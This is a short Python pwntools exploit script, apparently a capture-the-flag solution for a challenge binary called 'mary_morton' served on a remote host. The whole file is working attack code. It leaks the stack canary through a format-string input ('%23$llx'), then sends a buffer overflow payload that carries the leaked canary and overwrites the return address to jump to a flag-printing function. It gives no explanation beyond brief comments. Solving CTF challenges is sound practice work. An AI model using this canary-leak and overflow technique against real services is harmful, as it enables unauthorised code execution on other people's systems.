#!/bin/env python
# -*- coding: utf-8 -*-

# MIT License
#
# Copyright (c) 2017 Pietro Ferretti
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

'''Buffer overflow (with canary)'''

from pwn import *
context.binary = './mary_morton'

HOST = '146.185.132.36'
PORT = 19153
FLAG_FUNCTION = 0x4008DE

with remote(HOST, PORT) as conn:
# with process('./mary_morton') as conn:
    # leak canary
    conn.recvuntil('battle \n')
    conn.sendline('2')          # format string
    conn.sendline('%23$llx')    # print canary
    leak = conn.recvline().strip()
    canary = leak.decode('hex')[::-1]
    print 'Canary:', leak

    # buffer overflow
    conn.recvuntil('battle \n')
    conn.sendline('1')            # buffer overflow
    payload = ''
    payload += 'A' * 136
    payload += canary
    payload += 'B' * 8            # saved ebp
    payload += p64(FLAG_FUNCTION)
    conn.send(payload)

    conn.interactive()
